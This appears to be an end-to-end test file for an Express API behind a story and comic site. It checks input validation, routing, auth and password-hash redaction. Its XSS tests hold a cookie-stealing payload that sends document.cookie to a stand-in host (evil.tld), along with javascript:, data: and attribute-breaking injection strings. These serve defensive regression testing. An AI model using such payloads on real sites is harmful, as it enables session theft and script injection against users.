'use strict';

/**
 * End-to-end HTTP tests against the real Express app.
 *
 * Uses the real routing, auth middleware, express-validator chains and error
 * handler, with only the database replaced by a double. This is what catches
 * route-ordering and validation-chain mistakes that unit tests miss.
 */
const test = require('node:test');
const assert = require('node:assert/strict');

process.env.DATABASE_URL ||= 'postgres://stub/stub';
process.env.DATABASE_SSL = 'false';
process.env.JWT_SECRET ||= 'test-secret';
process.env.NODE_ENV = 'test';
process.env.RATE_LIMIT_MAX_REQUESTS = '10000';
process.env.AUTH_RATE_LIMIT_MAX_REQUESTS = '10000';

const { createFakePool, seedRow } = require('./helpers/fakePool');

const jwt = require('jsonwebtoken');

const JWT_SECRET = process.env.JWT_SECRET;

/** Boots the real app with a double attached, listening on an ephemeral port. */
async function withServer(rows, fn) {
  const fake = createFakePool({ rows });
  const db = require('../src/config/db');
  const Base = require('../src/models/_base');
  Base._clearColumnCache();
  db.setPool(fake);

  const app = require('../src/app');
  const server = await new Promise((resolve) => {
    const s = app.listen(0, () => resolve(s));
  });
  const { port } = server.address();
  const call = async (method, path, { token, body } = {}) => {
    const headers = {};
    if (token) headers.Authorization = `Bearer ${token}`;
    if (body !== undefined) headers['Content-Type'] = 'application/json';
    const res = await fetch(`http://127.0.0.1:${port}${path}`, {
      method, headers, body: body === undefined ? undefined : JSON.stringify(body),
    });
    let json = null;
    try { json = await res.json(); } catch (_) { /* non-JSON response */ }
    return { status: res.status, body: json };
  };

  try {
    return await fn({ call, fake, token: (id, role = 'user') => jwt.sign({ id, role }, JWT_SECRET) });
  } finally {
    await new Promise((resolve) => server.close(resolve));
    db.setPool(null);
    Base._clearColumnCache();
  }
}

const userRow = (over = {}) => seedRow('users', {
  id: 'u1', username: 'alice', display_name: 'Alice', email: 'alice@example.com',
  password: '$2b$12$HASHVALUE', role: 'user', library: [], downloads: [],
  is_banned: false, is_removed: false, ...over,
});

/* ------------------------------------------------------------------ *
 * The stored-XSS fix: malicious creator input must be rejected outright.
 * ------------------------------------------------------------------ */
const XSS_PAYLOAD = '<img src=x onerror=fetch("//evil.tld/?c="+document.cookie)>';

test('POST /api/series rejects an XSS payload in genres', async () => {
  await withServer({ users: [userRow()] }, async ({ call, token }) => {
    const { status, body } = await call('POST', '/api/series', {
      token: token('u1'),
      body: {
        title: 'Innocent title', type: 'novel', author: 'A', synopsis: 'x',
        genres: [XSS_PAYLOAD], rightsAttested: 'true', ageConfirmed: 'true',
      },
    });
    assert.equal(status, 400, `expected rejection, got ${status}: ${JSON.stringify(body)}`);
    assert.ok(JSON.stringify(body).includes('genres'), 'the error should name the field');
  });
});

test('POST /api/series rejects an XSS payload in tags', async () => {
  await withServer({ users: [userRow()] }, async ({ call, token }) => {
    const { status } = await call('POST', '/api/series', {
      token: token('u1'),
      body: {
        title: 'T', type: 'novel', author: 'A', synopsis: 'x',
        tags: ['<script>alert(1)</script>'], rightsAttested: 'true',
      },
    });
    assert.equal(status, 400);
  });
});

test('POST /api/series rejects a coverImage that is not an upload path or https URL', async () => {
  await withServer({ users: [userRow()] }, async ({ call, token }) => {
    for (const cover of [
      'https://evil.tld/x" onmouseover="alert(1)',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      '/etc/passwd',
    ]) {
      const { status } = await call('POST', '/api/series', {
        token: token('u1'),
        body: { title: 'T', type: 'novel', author: 'A', synopsis: 'x', coverImage: cover, rightsAttested: 'true' },
      });
      assert.equal(status, 400, `coverImage was accepted: ${cover}`);
    }
  });
});

test('POST /api/series accepts a legitimate cover path and normal genres', async () => {
  await withServer({ users: [userRow()] }, async ({ call, token }) => {
    const { status } = await call('POST', '/api/series', {
      token: token('u1'),
      body: {
        title: 'Legit', type: 'novel', author: 'A', synopsis: 'x',
        genres: ['Sci-Fi', 'Slice of Life'], tags: ['slow-burn'],
        coverImage: '/uploads/1712-ab12cd34ef56.jpg', rightsAttested: 'true',
      },
    });
    assert.equal(status, 201);
  });
});

test('POST chapter pages must be upload paths or https URLs', async () => {
  await withServer({
    users: [userRow()],
    series: [seedRow('series', { id: 's1', owner: 'u1', type: 'comic', is_removed: false })],
  }, async ({ call, token }) => {
    const { status } = await call('POST', '/api/series/s1/chapters', {
      token: token('u1'),
      body: { title: 'Ch1', pages: ['https://evil.tld/x" onerror="alert(1)'] },
    });
    assert.equal(status, 400);
  });
});

/* ------------------------------------------------------------------ *
 * Route ordering: /mine and /rankings must not be read as ids.
 * ------------------------------------------------------------------ */
test('GET /api/series/mine is routed as a literal path, not an id', async () => {
  await withServer({
    users: [userRow()],
    series: [seedRow('series', { id: 's1', title: 'Mine', owner: 'u1', is_removed: false })],
  }, async ({ call, token }) => {
    const { status, body } = await call('GET', '/api/series/mine', { token: token('u1') });
    assert.equal(status, 200);
    assert.equal(body.success, true);
    assert.ok(Array.isArray(body.series));
    assert.equal(body.series[0].title, 'Mine');
  });
});

test('GET /api/series/mine requires authentication', async () => {
  await withServer({ users: [userRow()] }, async ({ call }) => {
    const { status } = await call('GET', '/api/series/mine');
    assert.equal(status, 401);
  });
});

test('GET /api/series/rankings stays reachable', async () => {
  await withServer({ series: [] }, async ({ call }) => {
    const { status, body } = await call('GET', '/api/series/rankings?range=weekly');
    assert.equal(status, 200);
    assert.equal(body.range, 'weekly');
  });
});

/* ------------------------------------------------------------------ *
 * Password handling.
 * ------------------------------------------------------------------ */
test('GET /api/admin/users never returns password hashes', async () => {
  await withServer({
    users: [userRow({ id: 'u2', username: 'root', role: 'admin' })],
  }, async ({ call, token }) => {
    const { status, body } = await call('GET', '/api/admin/users', { token: token('u2', 'admin') });
    assert.equal(status, 200);
    const serialised = JSON.stringify(body);
    assert.ok(!serialised.includes('HASHVALUE'), 'admin payload contained a password hash');
    assert.ok(!/"password"/.test(serialised), 'admin payload contained a password field');
  });
});

test('GET /api/admin/users is refused to non-admins', async () => {
  await withServer({ users: [userRow()] }, async ({ call, token }) => {
    const { status } = await call('GET', '/api/admin/users', { token: token('u1') });
    assert.equal(status, 403);
  });
});

test('GET /api/auth/me never echoes the password', async () => {
  await withServer({ users: [userRow()] }, async ({ call, token }) => {
    const { status, body } = await call('GET', '/api/auth/me', { token: token('u1') });
    assert.equal(status, 200);
    assert.equal(body.user.username, 'alice');
    assert.ok(!JSON.stringify(body).includes('HASHVALUE'));
  });
});

/* ------------------------------------------------------------------ *
 * Library responses.
 * ------------------------------------------------------------------ */
test('GET /api/library returns series documents for a signed-in reader', async () => {
  await withServer({
    users: [userRow({ library: ['s1', 's2'] })],
    series: [
      seedRow('series', { id: 's1', title: 'One', is_removed: false }),
      seedRow('series', { id: 's2', title: 'Two', is_removed: false }),
    ],
  }, async ({ call, token }) => {
    const { status, body } = await call('GET', '/api/library', { token: token('u1') });
    assert.equal(status, 200);
    assert.deepEqual(body.series.map((s) => s.title), ['One', 'Two']);
  });
});

test('GET /api/library/downloads resolves chapter ids', async () => {
  await withServer({
    users: [userRow({ downloads: [{ series: 's1', chapter: 'c1' }] })],
    series: [seedRow('series', { id: 's1', title: 'One', is_removed: false })],
    chapters: [seedRow('chapters', { id: 'c1', num: 3, title: 'Ch3', is_removed: false })],
  }, async ({ call, token }) => {
    const { status, body } = await call('GET', '/api/library/downloads', { token: token('u1') });
    assert.equal(status, 200);
    assert.equal(body.downloads.length, 1);
    assert.equal(body.downloads[0].chapter.id, 'c1');
    assert.equal(body.downloads[0].chapter.num, 3);
  });
});

test('POST /api/library/:seriesId rejects a non-uuid with 400', async () => {
  await withServer({ users: [userRow()] }, async ({ call, token }) => {
    const { status } = await call('POST', '/api/library/not-a-uuid', { token: token('u1') });
    assert.equal(status, 400);
  });
});

test('protected routes reject an absent or forged token', async () => {
  await withServer({ users: [userRow()] }, async ({ call }) => {
    assert.equal((await call('GET', '/api/library')).status, 401);
    assert.equal((await call('GET', '/api/library', { token: 'garbage' })).status, 401);
  });
});

test('banned accounts are rejected even with a valid token', async () => {
  await withServer({ users: [userRow({ is_banned: true })] }, async ({ call, token }) => {
    const { status, body } = await call('GET', '/api/auth/me', { token: token('u1') });
    assert.equal(status, 403);
    assert.match(body.message, /suspended/i);
  });
});

/* ------------------------------------------------------------------ *
 * Misc contract checks.
 * ------------------------------------------------------------------ */
test('GET /api/health reports a connected database', async () => {
  await withServer({}, async ({ call }) => {
    const { status, body } = await call('GET', '/api/health');
    assert.equal(status, 200);
    assert.equal(body.database, 'connected');
  });
});

test('GET /api/series returns total rather than the page size in `count`', async () => {
  await withServer({
    series: Array.from({ length: 3 }, (_, i) =>
      seedRow('series', { id: `s${i}`, is_removed: false })),
  }, async ({ call }) => {
    const { body } = await call('GET', '/api/series?limit=2&page=1');
    assert.equal(body.count, 3, 'count should be the total matching rows');
    assert.equal(body.pageCount, 2, 'pageCount should be the rows on this page');
    assert.equal(body.pages, 2);
  });
});

/*
 * Regression: the browse page sends `?type=&genre=&status=&tag=&q=` for unset
 * filters. express-validator's isIn() rejected the empty strings, so browsing
 * returned 400 for every unfiltered request.
 */
test('GET /api/series tolerates empty filter values', async () => {
  await withServer({ series: [seedRow('series', { id: 's1', is_removed: false })] }, async ({ call }) => {
    const { status, body } = await call('GET',
      '/api/series?type=&genre=&status=&sort=popular&tag=&q=&page=1&limit=24');
    assert.equal(status, 200, `empty filters must not 400: ${JSON.stringify(body)}`);
    assert.equal(body.series.length, 1);
  });
});

test('GET /api/series still rejects genuinely invalid filters', async () => {
  await withServer({ series: [] }, async ({ call }) => {
    assert.equal((await call('GET', '/api/series?type=bogus')).status, 400);
    assert.equal((await call('GET', '/api/series?sort=sideways')).status, 400);
    assert.equal((await call('GET', '/api/series?limit=9999')).status, 400);
    assert.equal((await call('GET', '/api/series?page=0')).status, 400);
  });
});

test('GET /api/series filters by genre and type', async () => {
  await withServer({
    series: [
      seedRow('series', { id: 's1', type: 'novel', genres: ['Fantasy'], is_removed: false }),
      seedRow('series', { id: 's2', type: 'comic', genres: ['Horror'], is_removed: false }),
    ],
  }, async ({ call, fake }) => {
    const fantasy = await call('GET', '/api/series?genre=Fantasy');
    assert.equal(fantasy.status, 200);
    assert.match(fake.log.at(-1).sql, /"genres" \? \$/, 'genre is a jsonb contains filter');
  });
});

test('GET /api/series hides removed series', async () => {
  await withServer({
    series: [seedRow('series', { id: 's1', is_removed: true })],
  }, async ({ call }) => {
    const { status } = await call('GET', '/api/series/s1');
    assert.equal(status, 404);
  });
});

test('only the owner may modify a series', async () => {
  await withServer({
    users: [userRow()],
    series: [seedRow('series', { id: 's1', owner: 'u9', is_removed: false })],
  }, async ({ call, token }) => {
    const { status } = await call('PATCH', '/api/series/s1', {
      token: token('u1'), body: { title: 'Hijacked' },
    });
    assert.equal(status, 403);
  });
});

test('GET /api/series/:id returns the comment list, not just a count', async () => {
  await withServer({
    series: [seedRow('series', { id: 's1', is_removed: false })],
    comments: [
      seedRow('comments', { id: 'k1', series: 's1', user: 'u1', rating: 5, is_removed: false }),
      seedRow('comments', { id: 'k2', series: 's1', user: 'u1', rating: 3, is_removed: false }),
    ],
    users: [userRow({ id: 'u1' })],
  }, async ({ call }) => {
    // A projection that dropped `id` left the controller filtering on
    // series._id === undefined, which silently returned an empty list while
    // commentCount still reported the right number.
    const { status, body } = await call('GET', '/api/series/s1/comments');
    assert.equal(status, 200);
    assert.equal(body.comments.length, 2, 'comment list must not be silently empty');
    assert.equal(body.comments[0].user.username, 'alice', 'populate resolves the author');
    assert.ok(body.comments[0].user.id, 'a projected populate target keeps its id');
  });
});

test('an unknown API route returns a structured 404', async () => {
  await withServer({}, async ({ call }) => {
    const { status, body } = await call('GET', '/api/nope');
    assert.equal(status, 404);
    assert.equal(body.success, false);
  });
});